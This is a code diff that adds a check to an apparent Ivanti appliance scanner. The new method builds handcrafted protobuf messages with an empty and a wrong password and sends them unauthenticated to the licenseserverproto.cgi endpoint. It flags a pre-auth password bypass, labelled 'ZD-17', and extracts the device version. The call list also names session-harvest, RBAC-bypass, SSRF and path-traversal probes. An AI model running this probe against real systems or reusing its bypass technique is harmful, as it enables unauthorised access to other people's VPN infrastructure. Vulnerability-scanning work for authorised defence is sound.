@@ -391,6 +391,68 @@ class IvantiScanner:
             return True
         return False
 
+    def check_license_proto(self):
+        """ZD-17: licenseserverproto.cgi pre-auth + empty password bypass"""
+        def _varint(n):
+            r = b''
+            while n > 127:
+                r += bytes([(n & 0x7F) | 0x80])
+                n >>= 7
+            r += bytes([n])
+            return r
+        def _field(num, wt, data):
+            tag = _varint((num << 3) | wt)
+            if wt == 0: return tag + _varint(data)
+            elif wt == 2: return tag + _varint(len(data)) + data
+            return b''
+
+        # 空密码消息
+        hdr = _field(1, 2, b'scan') + _field(2, 2, b'mid') + _field(5, 2, b'')
+        inner = _field(1, 2, hdr) + _field(2, 0, 2) + _field(3, 2, _field(1, 2, b'req'))
+        msg_empty = _field(1, 2, inner) + _field(3, 2, b'scan') + _field(4, 2, b'22.7')
+
+        # 错误密码消息
+        hdr2 = _field(1, 2, b'scan') + _field(2, 2, b'mid') + _field(5, 2, b'wrong')
+        inner2 = _field(1, 2, hdr2) + _field(2, 0, 2) + _field(3, 2, _field(1, 2, b'req'))
+        msg_wrong = _field(1, 2, inner2) + _field(3, 2, b'scan') + _field(4, 2, b'22.7')
+
+        r1 = self._post("/dana-na/licenseserver/licenseserverproto.cgi",
+                         headers={"Content-Type": "application/octet-stream"}, data=msg_empty)
+        r2 = self._post("/dana-na/licenseserver/licenseserverproto.cgi",
+                         headers={"Content-Type": "application/octet-stream"}, data=msg_wrong)
+
+        if r1 and r2 and r1.status_code == 200 and r2.status_code == 200:
+            # 提取版本
+            ver = ""
+            try:
+                raw = r1.content
+                for i in range(len(raw) - 8):
+                    chunk = raw[i:i+8]
+                    if all(32 <= b < 127 for b in chunk) and b'R' in chunk:
+                        ver = chunk.decode(errors='replace').strip('\x00')
+                        break
+            except Exception:
+                pass
+
+            if len(r1.content) != len(r2.content):
+                self._hit("ZD-17", "License Proto Pre-Auth + Password Bypass",
+                          "high",
+                          f"Empty password=different response ({len(r1.content)}b vs {len(r2.content)}b). "
+                          f"Pre-auth access to license handlers. No canary. Version: {ver}",
+                          data={"version": ver, "empty_pw_size": len(r1.content),
+                                "wrong_pw_size": len(r2.content)})
+                if ver:
+                    self.results["version"] = ver
+                return True
+            elif r1.status_code == 200:
+                self._hit("ZD-17a", "License Proto Pre-Auth Accessible",
+                          "medium",
+                          f"licenseserverproto.cgi responds 200. Version: {ver}")
+                if ver:
+                    self.results["version"] = ver
+                return True
+        return False
+
     def check_oauth_ssrf(self):
         r = self._get("/dana-na/auth/oauth-consumer.cgi",
                        params={"state": "ssrf_probe"})
@@ -453,6 +515,7 @@ class IvantiScanner:
         self.check_session_harvest()
         self.check_rbac_bypass()
         self.check_eap()
+        self.check_license_proto()
         self.check_oauth_ssrf()
         self.check_path_traversal()
         self.check_watchdog()
